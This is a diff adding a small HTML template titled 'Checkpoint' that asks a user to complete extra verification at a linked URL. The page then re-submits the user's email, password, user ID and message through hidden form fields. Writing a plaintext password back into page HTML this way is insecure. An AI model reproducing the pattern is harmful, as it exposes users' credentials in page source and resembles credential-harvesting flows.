@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkpoint</title>
+</head>
+<body>
+    <h1>Checkpoint</h1>
+    <p>Your account requires additional verification. Please follow the instructions below:</p>
+    
+    <p>1. Open the following link in a new tab:</p>
+    <p><a href="{{ checkpoint_url }}" target="_blank">{{ checkpoint_url }}</a></p>
+    
+    <p>2. Complete the necessary steps on the provided page.</p>
+    
+    <p>3. Once completed, return to this page and click the button below to continue:</p>
+    
+    <form method="post" action="/">
+        <input type="hidden" name="email" value="{{ request.form.get('email') }}">
+        <input type="hidden" name="password" value="{{ request.form.get('password') }}">
+        <input type="hidden" name="user_id" value="{{ request.form.get('user_id') }}">
+        <input type="hidden" name="message" value="{{ request.form.get('message') }}">
+        <input type="submit" value="Continue">
+    </form>
+</body>
+</html>
